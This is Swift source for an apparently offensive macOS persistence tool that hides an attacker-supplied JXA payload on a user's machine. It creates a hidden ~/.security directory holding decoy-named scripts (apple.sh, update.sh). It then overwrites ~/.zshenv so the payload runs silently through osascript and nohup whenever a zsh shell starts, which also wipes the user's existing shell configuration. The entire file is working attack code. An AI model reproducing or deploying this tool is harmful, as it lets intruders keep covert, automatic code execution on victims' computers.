import Foundation
import Cocoa

//Usage: ./ZshProfilePersistence [path_to_js_jxa_payload] [yes/no]

let uname = NSUserName()
let home = "/Users/\(uname)"
let sysVers = ProcessInfo.processInfo.operatingSystemVersion
var output = ""
let fileMan = FileManager.default
let name = CommandLine.arguments[0]

if CommandLine.arguments.count != 3{
    print("Usage: \(name) [path_to_js_jxa_payload] [yes/no]")
    print("Note: The yes/no option is for creation of local files in a hidden directory at $HOME/.security/")
    print("exiting...")
    exit(0)
}
else {
    do {
        var payload =
        """
        cd \(home)/.security && ./update.sh &
        """
        
        var hiddenPath = "\(home)/.security"
        var profile = "\(home)/.security/apple.sh"
        var isDir = ObjCBool(true)
        var hiddenDirectoryExistsCheck = fileMan.fileExists(atPath: hiddenPath, isDirectory: &isDir)
        
        var hiddenFiles = CommandLine.arguments[2]
        if (hiddenFiles == "yes" || hiddenFiles == "Yes" || hiddenFiles == "YES" || hiddenFiles == "y" || hiddenFiles == "Y"){
            if !hiddenDirectoryExistsCheck{
                try fileMan.createDirectory(atPath: hiddenPath, withIntermediateDirectories: false, attributes: nil)
                print("[+] Created a hidden directory at \(home)/.security")
            }
            
            var payloadPath = "\(home)/.security/apple.sh"
            try payload.write(to: URL(fileURLWithPath: payloadPath), atomically: true, encoding: String.Encoding.utf8)
            
            var persistPath = "\(home)/.security/update.sh"
            var persist = "osascript " + CommandLine.arguments[1]
            try persist.write(to: URL(fileURLWithPath: persistPath), atomically: true, encoding: String.Encoding.utf8)
            
            print("[+] Wrote apple.sh and update.sh to \(home)/.security/")
            
            var attributes = [FileAttributeKey : Any]()
            attributes[.posixPermissions] = 0o755
            try fileMan.setAttributes(attributes, ofItemAtPath: payloadPath)
            
            try fileMan.setAttributes(attributes, ofItemAtPath: persistPath)
            
            //writing for newer versions of macOS that use zsh:
            var profilePath = "\(home)/.zshenv"
            try profile.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)

            print("[+] Persitence installed at \(home)/.zshenv")
            
            
        }
        else {
            
            var payload =
            """
            setopt LOCAL_OPTIONS NO_MONITOR; nohup \(payload) > /dev/null 2>&1&
            """
            
            var persist = "osascript " + CommandLine.arguments[1]
            
            var payload2 =
            """
            setopt LOCAL_OPTIONS NO_MONITOR; nohup \(persist) > /dev/null 2>&1&
            """
          
            var profilePath = "\(home)/.zshenv"
            try payload2.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)
            print("[+] Persistence via a direct osascript execution installed at \(home)/.zshenv")
        }
        
        
        }
    catch let error{
        print(error)
    }
}

